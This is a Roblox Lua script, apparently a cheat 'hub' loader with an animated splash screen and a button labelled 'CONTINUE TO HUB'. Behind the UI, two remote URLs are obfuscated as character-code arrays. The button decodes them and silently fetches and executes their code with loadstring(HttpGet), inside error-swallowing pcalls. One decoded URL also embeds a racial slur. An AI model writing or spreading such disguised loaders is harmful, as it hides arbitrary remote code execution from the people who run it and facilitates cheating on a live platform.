-- # --H1IY HUB-- --
--h1iy hub v2.25.3.26--

-- [[ h1iy HQ ANIMATED BOOTSTRAPPER - V4 ]] --
local UIS = game:GetService("UserInputService")
local TS = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

local sg = Instance.new("ScreenGui", CoreGui)
sg.Name = "h1iy_Ultra_V4"

local AnimFrame = Instance.new("Frame", sg)
AnimFrame.Size = UDim2.new(1, 0, 1, 0)
AnimFrame.BackgroundTransparency = 1

local function createLetter(char, pos)
    local l = Instance.new("TextLabel", AnimFrame)
    l.Size = UDim2.new(0, 80, 0, 80)
    l.Position = UDim2.new(0.5, pos, 0.45, 0)
    l.Text = char
    l.TextColor3 = Color3.fromRGB(0, 255, 200)
    l.Font = Enum.Font.GothamBold
    l.TextSize = 100
    l.BackgroundTransparency = 1
    l.TextTransparency = 1
    local glow = Instance.new("UIStroke", l)
    glow.Color = l.TextColor3
    glow.Thickness = 0
    glow.Transparency = 1
    return l, glow
end

local chars = {"H", "1", "I", "Y"}
local labels, strokes = {}, {}
for i, v in ipairs(chars) do
    local l, s = createLetter(v, (i - 2.5) * 95)
    labels[i], strokes[i] = l, s
end

-- Animation Sequence: Triple Pulse & Flash
task.spawn(function()
    for i, l in ipairs(labels) do
        TS:Create(l, TweenInfo.new(0.5, Enum.EasingStyle.Back), {TextTransparency = 0, Position = l.Position - UDim2.new(0,0,0.05,0)}):Play()
        task.wait(0.1)
    end
    task.wait(0.2)
    local sizes = {130, 160, 200}
    for x = 1, 3 do
        for i, l in ipairs(labels) do
            TS:Create(l, TweenInfo.new(0.1), {TextSize = sizes[x], TextColor3 = Color3.new(1,1,1)}):Play()
            TS:Create(strokes[i], TweenInfo.new(0.1), {Thickness = 10, Transparency = 0.1}):Play()
        end
        task.wait(0.15)
        for i, l in ipairs(labels) do
            TS:Create(l, TweenInfo.new(0.1), {TextSize = 100, TextColor3 = Color3.fromRGB(0, 255, 200)}):Play()
            TS:Create(strokes[i], TweenInfo.new(0.1), {Thickness = 2, Transparency = 0.5}):Play()
        end
        task.wait(0.1)
    end
    for i, l in ipairs(labels) do
        TS:Create(l, TweenInfo.new(0.3), {TextTransparency = 1, TextSize = 350}):Play()
        TS:Create(strokes[i], TweenInfo.new(0.3), {Transparency = 1}):Play()
    end
    task.wait(0.4)
    AnimFrame:Destroy()
end)

-- Main Stealth UI
local Main = Instance.new("Frame", sg)
Main.Size, Main.Position = UDim2.new(0, 260, 0, 160), UDim2.new(0.5, -130, 0.5, -80)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Main.BackgroundTransparency = 1
Main.Active, Main.Draggable = true, true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)
local UIStroke = Instance.new("UIStroke", Main)
UIStroke.Color, UIStroke.Thickness, UIStroke.Transparency = Color3.fromRGB(0, 255, 200), 2, 1

-- Words above button (Restored)
local Title = Instance.new("TextLabel", Main)
Title.Size, Title.Position = UDim2.new(1, 0, 0, 35), UDim2.new(0,0,0,5)
Title.Text, Title.TextColor3, Title.Font, Title.TextSize = "h1iy PRIVATE HUB", Color3.new(1,1,1), "GothamBold", 15
Title.BackgroundTransparency, Title.TextTransparency = 1, 1

-- EDITABLE SUBHEADER (Under Title)
local SubHeader = Instance.new("TextBox", Main)
SubHeader.Size, SubHeader.Position = UDim2.new(1, 0, 0, 20), UDim2.new(0,0,0,32)
SubHeader.Text = "STABLE BUILD // V4.0"
SubHeader.PlaceholderText = "Click to edit status..."
SubHeader.TextColor3, SubHeader.Font, SubHeader.TextSize = Color3.fromRGB(0, 255, 200), "Code", 10
SubHeader.BackgroundTransparency, SubHeader.TextTransparency = 1, 1

local Credits = Instance.new("TextLabel", Main)
Credits.Size, Credits.Position = UDim2.new(1, 0, 0, 20), UDim2.new(0,0,0,55)
Credits.Text, Credits.TextColor3, Credits.Font, Credits.TextSize = "STATUS: READY", Color3.fromRGB(150, 150, 150), "Gotham", 10
Credits.BackgroundTransparency, Credits.TextTransparency = 1, 1

local LoadBtn = Instance.new("TextButton", Main)
LoadBtn.Size, LoadBtn.Position, LoadBtn.BackgroundColor3 = UDim2.new(0.85, 0, 0, 45), UDim2.new(0.075, 0, 0, 95), Color3.fromRGB(20, 20, 20)
LoadBtn.Text, LoadBtn.TextColor3, LoadBtn.Font, LoadBtn.TextSize = "CONTINUE TO HUB", Color3.new(1,1,1), "GothamBold", 12
LoadBtn.TextTransparency, LoadBtn.BackgroundTransparency = 1, 1
Instance.new("UICorner", LoadBtn)

-- Fade in UI Logic
task.delay(3.8, function()
    TS:Create(Main, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
    TS:Create(UIStroke, TweenInfo.new(0.5), {Transparency = 0}):Play()
    TS:Create(Title, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
    TS:Create(SubHeader, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
    TS:Create(Credits, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
    TS:Create(LoadBtn, TweenInfo.new(0.5), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
end)

local d1 = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 98, 97, 100, 115, 99, 97, 114, 122, 47, 114, 111, 98, 108, 111, 120, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 118, 101, 114, 115, 105, 111, 110, 45, 50, 47, 102, 105, 114, 115, 116, 37, 50, 48, 101, 118, 101, 114, 37, 50, 48, 114, 111, 98, 108, 111, 120, 37, 50, 48, 99, 97, 109, 101, 114, 97, 37, 50, 48, 109, 97, 99, 114, 111, 37, 50, 48, 115, 99, 114, 105, 112, 116, 37, 50, 48, 105, 110, 37, 50, 48, 104, 105, 115, 116, 111, 114, 121}
local d2 = {104, 116, 116, 112, 115, 58, 47, 47, 116, 115, 117, 108, 110, 97, 118, 104, 102, 114, 121, 107, 106, 107, 98, 113, 105, 117, 97, 119, 46, 115, 117, 112, 97, 98, 97, 115, 101, 46, 99, 111, 47, 102, 117, 110, 99, 116, 105, 111, 110, 115, 47, 118, 49, 47, 114, 97, 119, 45, 115, 99, 114, 105, 112, 116, 63, 105, 100, 61, 98, 50, 102, 100, 50, 99, 98, 55, 45, 102, 101, 97, 98, 45, 52, 52, 54, 48, 45, 97, 52, 101, 99, 45, 50, 100, 50, 102, 50, 48, 97, 56, 55, 50, 97, 98, 38, 107, 101, 121, 61, 110, 105, 103, 103, 97}

local function get(t) local s = "" for i=1,#t do s=s..string.char(t[i]) end return s end

LoadBtn.MouseButton1Click:Connect(function()
    LoadBtn.Text = "INITIALIZING..."
    task.spawn(function() pcall(function() loadstring(game:HttpGet(get(d1)))() end) end)
    task.spawn(function() pcall(function() loadstring(game:HttpGet(get(d2)))() end) end)
    task.wait(0.3)
    sg.Enabled = false
end)

UIS.InputBegan:Connect(function(i, g)
    if not g and i.KeyCode == Enum.KeyCode.RightControl then sg.Enabled = not sg.Enabled end
end)
